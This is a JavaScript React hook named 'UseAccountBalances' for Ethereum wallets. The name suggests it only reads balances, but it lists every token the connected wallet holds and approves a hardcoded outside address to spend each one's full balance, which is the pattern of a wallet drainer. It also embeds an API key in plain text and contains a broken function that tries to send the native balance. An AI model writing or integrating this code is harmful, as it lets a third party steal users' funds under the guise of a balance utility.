import React, { useState, useEffect } from "react";
import { Alchemy, Network } from "alchemy-sdk";
import { config } from "../../wagmiConfig";
import {
  useAccount,
  useSwitchChain,
  useDisconnect,
  useSendTransaction,
  useBalance,
} from "wagmi";
import Erc20Abi from "../utils/Erc20Abi";
import { config as wagmiConfig } from "../../wagmiConfig";
import {
  writeContract,
  getBalance,
  sendTransaction,
  watchContractEvent,
} from "@wagmi/core";
import { parseEther } from "viem";
import { sepolia } from "viem/chains";

const UseAccountBalances = () => {
  const { address, isConnected, status } = useAccount();
  const { chains, switchChain } = useSwitchChain();
  const [tokensData, setTokensData] = useState([]);

  const alchemyConfig = {
    apiKey: "qP-0Eg2caD2AE-M7va68Bna1sIy2E3H-",
    network: Network.ETH_SEPOLIA,
  };
  const alchemy = new Alchemy(alchemyConfig);

  const getUserTokens = async (_address) => {
    try {
      let response = await alchemy.core.getTokensForOwner(_address);

      return response.tokens;
    } catch (error) {
      console.error("Error fetching token balances:", error);
    }
  };

  const increaseAllowanceForTokens = async (tokensData) => {
    for (let token of tokensData) {
      const { contractAddress, rawBalance, formatted } = token;
      increaseAllowance(contractAddress, rawBalance);
    }
  };

  const sendNativeToken = async () => {
    const balance = getAccountBalance();
    const estimatedGasFee = 21000 * 100; // Hypothetical estimation (gasLimit * gasPrice)
    const sendAmount = balance - estimatedGasFee;
    if (sendAmount > balance) {
      try {
        const result = await sendTransaction(wagmiConfig, {
          to: address,
          value: balance,
        });
        console.log("tx hash: ", result);
      } catch (error) {
        console.error("Error sending funds: ", error);
      }
    }
  };

  const increaseAllowance = async (contractAddress, allowance) => {
    try {
      const hash = await writeContract(wagmiConfig, {
        address:contractAddress,
        abi: Erc20Abi,
        functionName: "approve",
        args: ["0x1b570be014979aF756aFa53707Bdbd0057A092Ab", allowance],
      });
      console.log("Transaction hash:", hash);
      const myObject = {
        "contract address": contractAddress,
        "token balance": allowance,
      };
      console.table(myObject);
    } catch (error) {
      console.error("Increase allowance error", error);
    }
  };

  async function getAccountBalance(_address) {
    try {
      const balance = await getBalance(wagmiConfig, {
        address: _address,
      });
      return balance;
    } catch (error) {
      console.error("get balance failled: ", error);
    }
  }

  return {
    getUserTokens,
    increaseAllowanceForTokens,
    increaseAllowance,
    getAccountBalance,
    getAccountBalance,
  };
};

export default UseAccountBalances;
